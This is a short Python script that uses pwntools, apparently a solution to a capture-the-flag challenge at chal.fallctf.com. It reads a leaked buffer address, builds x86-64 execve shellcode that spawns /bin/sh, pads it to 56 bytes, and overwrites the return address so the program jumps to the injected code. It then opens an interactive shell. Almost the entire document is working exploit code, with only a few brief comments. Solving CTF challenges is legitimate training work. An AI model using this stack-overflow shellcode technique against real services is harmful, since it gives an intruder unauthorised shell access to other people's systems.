from pwn import *

# Connect to the instance
conn = remote('chal.fallctf.com', 5005)
# Use process() for local challenge files.
# conn = process('./challenge')

# get address of name
conn.recvuntil(b'store it safely at ')
name_addr = int(conn.recvline().decode().strip(), 16)
log.info(f'name address: {hex(name_addr)}')

conn.recvuntil(b'> ')

# Send the payload
shellcode = asm("""
	xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
""", arch='amd64', os='linux')

# jump to our shellcode which is at name_addr
conn.sendline(shellcode + b'A'*(56-len(shellcode)) + p64(name_addr))

conn.interactive()
